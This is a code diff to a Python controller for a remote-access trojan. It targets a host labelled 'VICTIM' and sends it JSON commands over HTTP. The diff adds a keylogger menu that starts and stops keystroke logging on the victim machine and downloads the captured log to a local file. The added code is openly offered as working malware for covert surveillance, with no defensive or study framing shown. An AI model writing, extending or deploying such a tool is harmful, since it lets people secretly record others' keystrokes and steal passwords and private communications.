@@ -12,9 +12,10 @@ VICTIM = ["127.0.0.1",1337]; # (<ip_address>, <port_no.>)
 
 ''' FUNCTIONS '''
 def menu():
-	choices = ["tunnel", "quit"];
+	choices = ["tunnel", "keylogger", "quit"];
 	print(" :: MENU ::");
 	print(" - tunnel");
+	print(" - keylogger");
 	print(" - quit");
 	while True:
 		inp = input("-> ").lstrip(" ").rstrip(" ");
@@ -26,7 +27,7 @@ def menu():
 payload format:
 
 '''	
-def send(action,**params):
+def send(action,**params): # send(action [, sub_action=<>, extras=<>])
 	params["action"]=action;
 	payload = json.dumps(params);
 	vic_url = "http://"+VICTIM[0]+":"+str(VICTIM[1])+"";
@@ -74,6 +75,29 @@ def tunnel():
 		threading.Thread(target=os.system("xdg-open op.html 1> /dev/null"));
 	return;
 
+def keylogger(): 
+	print(":: Keylogger ::");
+	print("1 - Start keylogger");
+	print("2 - Stop Keylogger (do this first if you want to fetch the log file)");
+	print("3 - Get log file");
+	sub_action = int(input("-> "));
+	
+	if sub_action == 1:
+		sub_action = "start";
+	elif sub_action == 2:
+		sub_action = "stop";
+	elif sub_action == 3:
+		sub_action = "get";
+		
+	resp = send("keylogger",sub_action=sub_action);
+	if sub_action == "get":
+		print("Fetched log file, saving to log.txt");
+		f = open("log.txt","wb");
+		f.write(resp);
+		f.close();
+	
+	return;
+
 def get_target():
 	while True:
 		ip = input("Victim Address -> ");
@@ -94,6 +118,8 @@ if __name__ == "__main__":
 		choice = menu();
 		if choice == "tunnel":
 			tunnel();
+		if choice == "keylogger":
+			keylogger();
 		elif choice == "quit":
 			run_flag = False;
 		print("\n\n");
